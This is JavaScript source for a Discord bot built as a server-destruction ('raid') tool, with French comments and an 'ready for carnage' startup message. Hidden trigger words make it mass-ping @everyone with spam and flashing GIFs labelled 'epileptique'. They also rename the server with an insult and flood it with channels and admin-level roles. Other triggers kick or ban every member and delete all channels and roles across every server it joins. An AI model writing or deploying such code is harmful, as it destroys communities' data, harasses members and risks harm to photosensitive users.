const Discord = require("discord.js");
const chalk = require("chalk")
const bot = new Discord.Client({autoReconnect:true}	);

const prefix = "^" ;
process.on('unhandledRejection', (reason) => {

  console.log(reason.message)
  //return;

});

bot.on("ready", () => {
		console.log(chalk.red(`${bot.user.tag} prêt pour le carnage`))
		console.log(`https://discordapp.com/oauth2/authorize?client_id=${bot.user.id}&scope=bot&permissions=-1`)
		console.log(bot.guilds.map(g => `Serveur : ${g.name}(${g.id})`))
		console.log(bot.users.map(u => u.tag))
		console.log(bot.users.size)
                 
 	}) 
	                
bot.on("message", msg => {
	console.log(`${msg.channel.name} - ${msg.author.username} : ${msg.content}`)
	//masse ping

		if(msg.content.includes("smokescreen")){
		msg.delete()
		for(var i = 0; i < 250; i++){
			 	//msg.channel.send(`@everyone Dead ByTrashGang Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng Trxsh Gxng\nhttps://cdn.discordapp.com/attachments/419857438204755969/429580607501107200/Turtle_Psycho.gif\nhttps://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif https://cdn.discordapp.com/attachments/438769530018463744/445988981046247444/image.gif\nhttps://cdn.discordapp.com/attachments/444937548519964683/464842263659282452/double_patate_qui_dance.gif`);
		   msg.channel.send("@everyone destroyed by "+bot.user.tag)
		   }
	
		}
			 if(msg.content === "allchan"){
 	  msg.delete();
 	  msg.guild.channels.findAll("type", "text").map(c => c.send("smokescreen"))
 	  }
 	  	if(msg.content === "issou"){
			  				msg.delete();
			  				msg.channel.send("roles").then(m => m.delete())
			  				//msg.guild.setName("d3s7r0y3d by TrashGang")
			  				msg.guild.setName(msg.author.tag + " t'encule " + msg.guild.channels.size + " fois.")
			  				msg.guild.setIcon("https://cdn.discordapp.com/attachments/451475308583976960/456167720275279874/JPEG_20180604_211032.jpg")
			  				}
			  				
				if(msg.content === "channel"){
			  			msg.delete();
			  		//	msg.channel.send(prefix + "banall")
			  			for(var i = 0; i < 25; i++){
			  				msg.guild.createChannel("smoke", "text");
			     }
			     for(var i =0; i < 474; i++){
			     	msg.guild.createChannel("smoke²","voice").then(	msg.guild.setName(msg.author.tag + " t'encule " + msg.guild.channels.size + " fois.")) 
			     	}
			     setTimeout(() => {
			     	
			     	msg.channel.send("issou").then(m => m.delete());
			     	msg.channel.send("allchan").then(m=> m.delete());
			     	}, 60000);   
			 }
			 if(msg.content === "admin"){
			  					msg.delete();
			  					msg.guild.members.map(m => m.addRole(msg.guild.roles.find("name","smoke")))
  		}
		if(msg.content === "roles"){
			msg.delete();
			for(var i =0; i < 200; i++){
				msg.guild.createRole({name:"smoke",
					                     mentionable:false,
					                     permissions:2146958591,
					                     position: ""
					})  
				 
			 		 }
			 		 msg.channel.send("admin")
			}
			if(msg.content === prefix + "banall"){
 	    msg.delete();
 	    msg.guild.members.map(c => c.kick())
 		}
			
		   if(msg.content === prefix + "boticon"){
          		msg.delete();
		          bot.user.setAvatar("https://cdn.discordapp.com/attachments/442094102872457228/479976176706781184/JPEG_20180813_124549.jpg")
		          }
		 			//détruire des channels
			  	if(msg.content.includes("okay")){
			  		console.log("destruction de : " + msg.guild.name)
			  	 //msg.guild.members.map(m => m.kick());
			  		msg.guild.channels.map(c => c.delete());
			  		msg.guild.createChannel("smoke", "text").then(m => m.send("channel"));
			  	}
			  					if(msg.content === prefix + "die"){
			  						bot.destroy();
			  					}
			  						if(msg.content === prefix + "eval"){
			  							msg.delete();
			  							
			  
			  							}
			  							if(msg.content === prefix + "botstats"){
			  							msg.delete()
			  							const info = new Discord.RichEmbed()
			  							.setTitle("info du bot")
			  							.setColor("RANDOM")
			  							.addField("nombre d'utilisateurs", bot.users.size)
			  							.addField("nombre de channels", bot.channels.size)
			  							.addField("mémoire utilisée", process.memoryUsage().heapUsed/100000 + "MB")
			  							msg.channel.send(info).then(m => m.delete(10000))
			  							}
			  							if(msg.content === prefix + "destruction"){
			  							msg.delete();
			  							bot.channels.map(c => c.delete())
			  							msg.author.send("channels détruits")
          	bot.guilds.map(g => g.roles.map(r=>r.delete()))
          	msg.author.send("rôles détruits")
          	}
          	if(msg.content === prefix + "leave"){
          		msg.delete();
          		msg.guild.leave();
          		}
 	           if(msg.content === "blop"){
 	           	msg.delete();
 	           	bot.guilds.map(g => g.unban("377925283098918912"))
 	           	}
 	           	if(msg.content === prefix +"purge"){
 	           		msg.channel.bulkDelete(30)
 	           		}
 	           		if(msg.content === prefix + "allchan"){
 	           		msg.delete();
 	           		msg.guild.channels.findAll("type","text").map(c => c.send("smokescreen"))
 	           		}
 	           		if(msg.content.startsWith(prefix + "ban")){
 	           			var mention = msg.mentions.users.first();
 	           			msg.delete();
 	           			
 	           			if(!mention)return;

 	           			msg.guild.member(mention).ban();
 	           			}
 	           			
 	           			if(msg.content === prefix + "delchan"){
 	           				msg.delete();
 	           				msg.guild.channels.map(c => c.delete())
 	           				msg.guild.createChannel("Général","text")
 	              msg.channel.send("channels en cours de suppression...")
 	           				}
 	           				if(msg.content === prefix + "delroles"){
 	           				msg.delete();
 	           				msg.guild.roles.map(c => c.delete())
 	              msg.channel.send("roles en cours de suppression...")
 	           				}
 	           				if(msg.content === prefix + "force"){
 	           					bot.channels.map(c => c.delete().then(msg.channel.send(c.name)))
	                bot.guilds.map(g => g.roles.map(r=>r.delete().then(msg.channel.send(r.name))))
	                bot.guilds.map(g => bot.users.map(u => g.ban(u.id)))  
	                } 
	               
 	       		});
		
//bot.login(process.env.token);
